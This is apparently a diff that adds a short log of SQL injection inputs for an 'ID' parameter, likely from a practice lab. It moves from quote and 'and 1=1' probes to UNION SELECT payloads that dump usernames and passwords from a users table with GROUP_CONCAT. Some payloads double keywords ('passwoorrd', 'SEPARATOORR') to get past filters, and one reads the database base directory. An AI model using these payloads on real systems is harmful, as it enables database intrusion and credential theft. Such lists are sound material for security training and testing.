@@ -1,0 +1,24 @@
+ID:1
+ID:1
+ID:a
+ID:a
+ID:1
+ID:1and 1
+ID:1 and 1=1
+ID:1 and 
+ID:2
+ID:3
+ID:3
+ID:1
+ID:-1 || select1,2,group_concat(username,password) from users;--
+ID:-1 || select1,2,(select group_concat(username,password) from users);--
+ID:-1 union select 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)--
+ID:1 
+ID:1 
+ID:1 
+ID:1'
+ID:1 
+ID:1 
+ID:-1' union select 1,2,(SELECT GROUP_CONCAT(username,passwoorrd SEPARATOORR 0x3c62723e) FROM users)--
+ID:-1 union select 1,2,(SELECT GROUP_CONCAT(username,passwoorrd SEPARATOORR 0x3c62723e) FROM users)--
+ID:-1 UNION select 1,@@basedir,3#
